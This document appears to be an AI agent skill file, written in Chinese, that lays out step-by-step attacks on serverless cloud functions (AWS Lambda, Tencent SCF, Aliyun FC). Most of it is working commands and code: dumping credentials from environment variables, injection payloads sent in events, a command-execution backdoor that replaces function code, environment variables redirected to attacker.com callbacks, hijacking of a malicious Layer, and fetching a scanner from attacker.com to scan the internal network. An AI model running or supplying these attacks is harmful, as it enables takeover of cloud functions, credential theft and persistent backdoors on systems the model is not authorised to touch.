---
name: serverless-attack
description: "Serverless/云函数安全测试与攻击。当目标涉及 AWS Lambda、腾讯云 SCF、阿里云 FC、Azure Functions 等 Serverless 服务时使用。当发现 API Gateway 后端是 Lambda/SCF 触发、通过 cloud-aksk-exploit 获取到函数操作权限、或需要分析云函数代码中的漏洞时使用。覆盖事件注入（HTTP/OSS/消息队列触发器参数篡改）、环境变量泄露（硬编码凭据提取）、函数代码注入/覆盖（UpdateFunctionCode）、Runtime 利用（/tmp 写入/Layer 劫持/依赖投毒）、临时凭据滥用。发现任何 Lambda/SCF/云函数、API Gateway、或 Serverless 架构时都应使用此 skill"
metadata:
  tags: "serverless,lambda,scf,云函数,function,api gateway,事件注入,环境变量,runtime,layer,触发器,临时凭据"
  category: "cloud"
---

# Serverless/云函数攻击方法论

Serverless 函数运行在短暂的容器中，传统的持久化和横向移动思路不适用。攻击重点是：事件注入（输入篡改）、凭据提取（环境变量/临时 Token）、代码注入（修改函数代码）。

## Phase 0: 信息收集

### 0.1 发现 Serverless 函数

```bash
# AWS Lambda
aws lambda list-functions --region us-east-1
aws lambda list-functions --region ap-southeast-1
# 遍历所有 region
for r in us-east-1 us-west-2 eu-west-1 ap-northeast-1 ap-southeast-1; do
  echo "=== $r ===" && aws lambda list-functions --region $r --query 'Functions[].FunctionName' 2>/dev/null
done

# 腾讯云 SCF
tccli scf ListFunctions --Namespace default --Limit 100
tccli scf ListNamespaces  # 可能有多个命名空间

# 阿里云 FC
aliyun fc GET /services
```

### 0.2 获取函数详情

```bash
# AWS — 代码 + 配置 + 环境变量
aws lambda get-function --function-name FUNC_NAME
aws lambda get-function-configuration --function-name FUNC_NAME

# 腾讯云
tccli scf GetFunction --FunctionName FUNC_NAME --Namespace default
```

## Phase 1: 环境变量提取（最快获取凭据的方式）

开发者经常在环境变量中硬编码数据库密码、API Key、其他服务凭据：

```bash
# AWS Lambda
aws lambda get-function-configuration --function-name FUNC_NAME \
  --query 'Environment.Variables' --output json
# 常见敏感变量名：
# DB_PASSWORD, DATABASE_URL, MONGODB_URI
# AWS_ACCESS_KEY_ID（嵌套凭据）
# SECRET_KEY, JWT_SECRET, API_KEY
# REDIS_URL, SMTP_PASSWORD

# 腾讯云 SCF
tccli scf GetFunction --FunctionName FUNC_NAME \
  --query 'Environment.Variables'
# 常见：TENCENTCLOUD_SECRET_ID, DB_HOST, DB_PASSWORD
```

## Phase 2: 函数代码分析

### 2.1 下载代码

```bash
# AWS — 获取代码下载 URL
CODE_URL=$(aws lambda get-function --function-name FUNC_NAME \
  --query 'Code.Location' --output text)
curl -o lambda_code.zip "$CODE_URL"
unzip lambda_code.zip -d lambda_code/

# 腾讯云（代码在 GetFunction 响应中）
tccli scf GetFunction --FunctionName FUNC_NAME --query 'Code'
```

### 2.2 代码审计要点

```python
# 搜索硬编码凭据
grep -rn "password\|secret\|key\|token\|credential" lambda_code/

# 搜索不安全的输入处理
grep -rn "eval\|exec\|os.system\|subprocess\|pickle\|yaml.load" lambda_code/

# 搜索 SQL 拼接
grep -rn "format\|f'\|%s.*query\|execute" lambda_code/

# 检查依赖版本
cat lambda_code/requirements.txt  # Python
cat lambda_code/package.json      # Node.js
```

## Phase 3: 事件注入

Serverless 函数通过"事件"触发，事件数据就是输入——如果函数没有正确校验事件数据，就可以注入。

### 3.1 API Gateway → Lambda 注入

API Gateway 将 HTTP 请求封装为事件传给 Lambda：

```json
{
  "httpMethod": "POST",
  "path": "/api/query",
  "queryStringParameters": {"id": "1' OR '1'='1"},
  "body": "{\"username\": {\"$ne\": \"\"}}",
  "headers": {"X-Forwarded-For": "127.0.0.1"}
}
```

常见注入点：
- `queryStringParameters` → SQL/NoSQL 注入
- `body` → 反序列化/命令注入
- `headers` → SSRF/日志注入
- `pathParameters` → 路径遍历

### 3.2 OSS/COS/S3 触发器注入

对象存储触发器将文件信息作为事件：

```json
{
  "Records": [{
    "s3": {
      "bucket": {"name": "my-bucket"},
      "object": {"key": "../../../etc/passwd"}  // 路径遍历
    }
  }]
}
```

如果函数用 `event['key']` 拼接文件路径做 `open()` → 路径遍历。
如果函数处理上传的文件内容（如 XML/图片/CSV）→ XXE/SSRF/命令注入。

### 3.3 消息队列触发器

SQS/CMQ/Kafka 消息作为事件传入：
```json
{"Records": [{"body": "'; import os; os.system('id'); '"}]}
```

## Phase 4: 代码注入/覆盖

### 4.1 修改函数代码（需要 UpdateFunctionCode 权限）

```bash
# AWS — 用恶意代码替换函数
cat > /tmp/lambda_backdoor.py << 'EOF'
import os, json
def lambda_handler(event, context):
    # 原始功能 + 后门
    cmd = event.get('cmd', 'id')
    output = os.popen(cmd).read()
    return {'statusCode': 200, 'body': json.dumps({'output': output})}
EOF
cd /tmp && zip lambda_backdoor.zip lambda_backdoor.py
aws lambda update-function-code --function-name FUNC_NAME \
  --zip-file fileb:///tmp/lambda_backdoor.zip

# 腾讯云
tccli scf UpdateFunctionCode --FunctionName FUNC_NAME \
  --Handler index.main_handler --CosBucketName xxx --CosObjectName code.zip
```

### 4.2 修改环境变量（注入凭据或后门配置）

```bash
# AWS
aws lambda update-function-configuration --function-name FUNC_NAME \
  --environment '{"Variables":{"BACKDOOR_URL":"http://attacker.com/callback"}}'

# 腾讯云
tccli scf UpdateFunctionConfiguration --FunctionName FUNC_NAME \
  --Environment '{"Variables":[{"Key":"BACKDOOR","Value":"http://attacker.com"}]}'
```

### 4.3 Layer 劫持

Lambda Layers 是共享的代码库，修改 Layer 可以影响所有使用它的函数：

```bash
# 列出函数使用的 Layers
aws lambda get-function-configuration --function-name FUNC_NAME --query 'Layers'

# 发布恶意 Layer（替换依赖库）
# 比如替换 requests 库，在 __init__.py 中注入后门
aws lambda publish-layer-version --layer-name shared-lib \
  --zip-file fileb://malicious_layer.zip
```

## Phase 5: Runtime 环境利用

### 5.1 临时凭据

每个 Lambda/SCF 运行时都有临时凭据（来自函数的执行角色）：

```python
# 在函数代码中或通过 RCE 获取
import os
print(os.environ.get('AWS_ACCESS_KEY_ID'))
print(os.environ.get('AWS_SECRET_ACCESS_KEY'))
print(os.environ.get('AWS_SESSION_TOKEN'))

# 腾讯云 SCF
print(os.environ.get('TENCENTCLOUD_SECRETID'))
print(os.environ.get('TENCENTCLOUD_SECRETKEY'))
print(os.environ.get('TENCENTCLOUD_SESSIONTOKEN'))
```

这些凭据的权限就是函数执行角色的权限——可能比泄露的 AK/SK 权限更高。

### 5.2 /tmp 目录利用

Serverless 函数的 /tmp 是唯一可写目录，且在"热启动"时会保留：

```bash
# 写入工具到 /tmp
curl -o /tmp/fscan http://attacker.com/fscan && chmod +x /tmp/fscan

# 如果函数有内网访问权限（VPC 中），可以用 /tmp 的工具做内网扫描
/tmp/fscan -h 172.16.0.0/16 -p 22,3306,6379
```

## 决策树

```
发现 Serverless 函数
├── 有 GetFunction 权限 → 下载代码 → 审计 → 找漏洞/凭据
├── 有 GetFunctionConfiguration 权限 → 读环境变量 → 提取凭据
├── 有 UpdateFunctionCode 权限 → 注入后门 → RCE
├── 有 Invoke 权限 → 构造恶意事件 → 事件注入
├── 只有 API Gateway 入口 → HTTP 请求层注入（SQLi/NoSQL/SSRF）
└── 无直接权限 → 通过 S3/COS 触发器上传恶意文件
```
